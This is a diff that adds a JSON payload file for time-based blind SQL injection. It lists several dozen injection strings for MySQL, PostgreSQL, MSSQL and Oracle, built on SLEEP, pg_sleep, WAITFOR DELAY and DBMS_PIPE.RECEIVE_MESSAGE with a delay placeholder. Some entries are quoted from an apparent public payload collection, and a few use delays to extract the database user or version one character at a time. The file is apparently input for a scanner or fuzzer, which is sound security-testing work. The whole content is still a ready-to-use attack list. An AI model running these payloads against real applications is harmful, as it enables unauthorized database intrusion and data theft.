@@ -1,0 +1,415 @@
+{
+ "class": "sqli",
+ "entries": [
+  {
+   "payload": "' AND SLEEP({D})-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND SLEEP({D})#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND SLEEP({D})/**/",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND (SELECT SLEEP({D}))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND SLEEP({D})='",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND (SELECT*FROM(SELECT(SLEEP({D})))w)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND SLEEP({D})--+-",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND SLEEP({D})%23",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})/**/",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND (SELECT SLEEP({D}))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})=\"",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND (SELECT*FROM(SELECT(SLEEP({D})))w)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})--+-",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND SLEEP({D})%23",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})/**/",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND (SELECT SLEEP({D}))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})=)'",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND (SELECT*FROM(SELECT(SLEEP({D})))w)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})--+-",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND SLEEP({D})%23",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})/**/",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND (SELECT SLEEP({D}))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})=",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND (SELECT*FROM(SELECT(SLEEP({D})))w)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})--+-",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND SLEEP({D})%23",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "'||pg_sleep({D})--",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND pg_sleep({D})=1 --",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "';SELECT pg_sleep({D})--",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND (SELECT pg_sleep({D}))IS NOT NULL --",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "||pg_sleep({D})--",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND pg_sleep({D})=1 --",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "||pg_sleep({D})||",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ";SELECT pg_sleep({D})--",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND (SELECT pg_sleep({D}))IS NOT NULL --",
+   "dialect": "postgres",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "'; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\"; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND 1=1; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\"; IF(1=1) WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")'; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND 1=1; WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "; IF(1=1) WAITFOR DELAY '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{D})=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "'||DBMS_PIPE.RECEIVE_MESSAGE('a',{D})||'",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{D}) ELSE 0 END FROM DUAL)=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND DBMS_PIPE.RECEIVE_MESSAGE('a',{D})=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\"||DBMS_PIPE.RECEIVE_MESSAGE('a',{D})||\"",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{D}) ELSE 0 END FROM DUAL)=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{D})=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")'||DBMS_PIPE.RECEIVE_MESSAGE('a',{D})||)'",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": ")' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{D}) ELSE 0 END FROM DUAL)=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND DBMS_PIPE.RECEIVE_MESSAGE('a',{D})=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "||DBMS_PIPE.RECEIVE_MESSAGE('a',{D})||",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": " AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{D}) ELSE 0 END FROM DUAL)=1-- ",
+   "dialect": "oracle",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "2100935' OR IF(MID(@@version,1,1)='5',sleep({D}),1)='2",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "select 1 from pg_sleep({D})",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "1;waitfor delay '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',{D}) ELSE 1337 END)",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "' AND SLEEP({D})/*",
+   "dialect": "generic",
+   "source": "SQL Injection/README.md"
+  },
+  {
+   "payload": "XOR(IF(NOW()=SYSDATE(),SLEEP({D}),0))XOR",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": ";(select 1 from pg_sleep({D}))",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "1);waitfor delay '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "' AND '1'='1' AND SLEEP({D})",
+   "dialect": "generic",
+   "source": "SQL Injection/README.md"
+  },
+  {
+   "payload": "AND SLEEP({D})=0",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "||(select 1 from pg_sleep({D}))",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "1';waitfor delay '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "' ; WAITFOR DELAY '00:00:{D}' --",
+   "dialect": "generic",
+   "source": "SQL Injection/README.md"
+  },
+  {
+   "payload": "AND (SELECT 1337 FROM (SELECT(SLEEP({D}-(IF((1=1),0,10))))) RANDSTR)",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "AND 'RANDSTR'||PG_SLEEP({D})='RANDSTR'",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "1));waitfor delay '0:0:{D}'--",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "SLEEP({D}) /*' or SLEEP({D}) or '\" or SLEEP({D}) or \"*/",
+   "dialect": "generic",
+   "source": "SQL Injection/README.md"
+  },
+  {
+   "payload": "1 AND (SELECT SLEEP({D}) FROM DUAL WHERE DATABASE() LIKE '___')#",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "IF 1=1 WAITFOR DELAY '0:0:{D}' ELSE WAITFOR DELAY '0:0:{D}';",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP({D})) --",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "1 OR IF(MID(@@version,1,1)='5',sleep({D}),1)='2",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  }
+ ]
+}
